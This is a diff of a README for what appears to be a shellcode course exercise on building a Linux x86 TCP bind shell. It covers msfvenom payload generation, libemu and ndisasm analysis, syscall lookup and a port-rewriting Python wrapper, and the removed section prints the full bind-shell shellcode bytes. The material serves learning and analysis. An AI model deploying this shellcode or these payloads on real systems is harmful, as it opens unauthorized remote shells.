@@ -1,29 +1,24 @@
 # Exercise 1
 
+
 ## Usage
 
 ```
-python3 wrapper.py $PORT
+python wrapper.py $PORT
 ```
 
 ![Screenshot](images/wrapper/5.png)
 
-If the port causes problems, a warning message appears:
+If the port causes problems, a warning message will appear:
+
 ![Screenshot](images/wrapper/6.png)
 
 
-## Super-quick
 
-```
-msfvenom -p linux/x86/shell_bind_tcp LPORT=8888 --platform=Linux -a x86 -f c | grep '"' | sed -e 's/\"//g' | paste -sd "" -
-```
-```
-echo -ne "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\x02\x00\x22\xb8\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"  | ndisasm -u -
-```
+## First approach: Libemu
 
-## Steps
+After installing Libemu, we will use the *sctest* binary. We can get the result using the binary directly or the *libemu.sh* script (in **scripts/** folder):
 
-Get "sctest" result (also using *libemu.sh* script in **scripts/** folder):
 ```
 msfvenom -p linux/x86/shell_bind_tcp --platform=Linux -a x86 -f raw LPORT=8888 | ./sctest -vvv -Ss 10000 -G bindshell.dot
 
@@ -32,18 +27,8 @@ msfvenom -p linux/x86/shell_bind_tcp --platform=Linux -a x86 -f raw LPORT=8888 |
 sh libemu.sh "msfvenom -p linux/x86/shell_bind_tcp --platform=Linux -a x86 -f raw LPORT=8888" bindshell | tee libemu_res/libemu_res.txt
 ```
 
-Get hexadecimal values for every syscall (also using *syscallhex.sh* script in **scripts/** folder):
-```
-cat /usr/include/i386-linux-gnu/asm/unistd_32.h | listen
 
-printf "%x\n" 363
-
--------------------------------------
-
-sh syscallhex.sh listen
-```
-
-Result:
+The result:
 
 ```
 int socket (
@@ -151,6 +136,91 @@ int execve (
 ```
 
 
+Once we know the system calls or syscalls, the values used in them and the order, it is necessary to get the hexadecimal values for every syscall, using cat:
+
+```
+cat /usr/include/i386-linux-gnu/asm/unistd_32.h | listen
+
+printf "%x\n" 363
+```
+
+Or the *syscallhex.sh* script (in **scripts/** folder)
+
+```
+sh syscallhex.sh listen
+```
+
+Also it is important to know how the system calls work in Linux. As stated in the [Skape's paper about egghunters](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) "the system call interface that is exposed to user-mode applications in Linux (on IA32) is provided through soft-interrupt 0x80. The following table describes the register layout that is used across all system calls"
+
+![Screenshot](images/wrapper/7.png)
+
+Knowing this and the values from the Libemu's output, it is possible to write the nasm code.
+
+
+
+### Creating the Python wrapper 
+
+Get the shellcode:
+
+![Screenshot](images/wrapper/1.png)
+
+Change the "\\" to "\\\\":
+
+![Screenshot](images/wrapper/2.png)
+
+Detect where the port (8888 or 0x22b8 in hexadecimal) is being used:
+
+![Screenshot](images/wrapper/3.png)
+
+Now er know the value in the original shellcode which must be substituted:
+
+![Screenshot](images/wrapper/4.png)
+
+After this, we just must take the input to the wrapper script, translate the port number to hexadecimal (in big endian format) and print the new shellcode with the port updated.
+
+
+## Second approach: Ndisasm
+
+A second approach, which can be considered easier, is to get the nasm file from the raw output from msfvenom:
+```
+msfvenom -p linux/x86/shell_bind_tcp LPORT=8888 --platform=Linux -a x86 -f raw | ndisasm -u -
+```
+
+![Screenshot](images/wrapper/8.png)
+
+
+It can be compiled:
+
+![Screenshot](images/wrapper/9.png)
+
+
+And it works correctly:
+
+![Screenshot](images/wrapper/10.png)
+
+
+
+## Some useful links
+```
+http://man7.org/linux/man-pages/man2/socket.2.html
+https://stackoverflow.com/questions/19850082/using-nasm-and-tcp-sockets
+http://man7.org/linux/man-pages/man2/socket.2.html
+https://rosettacode.org/wiki/Sockets
+http://www6.uniovi.es/cscene/CS5/CS5-05.html
+https://stackoverflow.com/questions/48773917/why-creating-a-remote-shell-using-execve-doesnt-overwrite-file-descriptors-and
+https://www.tutorialspoint.com/assembly_programming/assembly_system_calls.htm
+```
+
+
+
+
+
+
+
+
+
+-------------------------------------------------
+
 ## Deleting NOPs
 
 [socket] generates NOPs:
@@ -172,34 +242,3 @@ It is possible to solve it using the stack:
 There is not NOPs anymore:
 
 ![Screenshot](images/5.png)
-
-
-
-## Creating Python wrapper 
-
-Get the shellcode:
-
-![Screenshot](images/wrapper/1.png)
-
-Change the "\\" to "\\\\":
-
-![Screenshot](images/wrapper/2.png)
-
-Detect where the port (8888 or 0x22b8 in hexadecimal) is being used:
-
-![Screenshot](images/wrapper/3.png)
-
-Substitute that value in the original shellcode for a variable:
-
-![Screenshot](images/wrapper/4.png)
-
-
-## Useful links
-```
-http://man7.org/linux/man-pages/man2/socket.2.html
-https://stackoverflow.com/questions/19850082/using-nasm-and-tcp-sockets
-http://man7.org/linux/man-pages/man2/socket.2.html
-https://rosettacode.org/wiki/Sockets
-http://www6.uniovi.es/cscene/CS5/CS5-05.html
-https://stackoverflow.com/questions/48773917/why-creating-a-remote-shell-using-execve-doesnt-overwrite-file-descriptors-and
-```
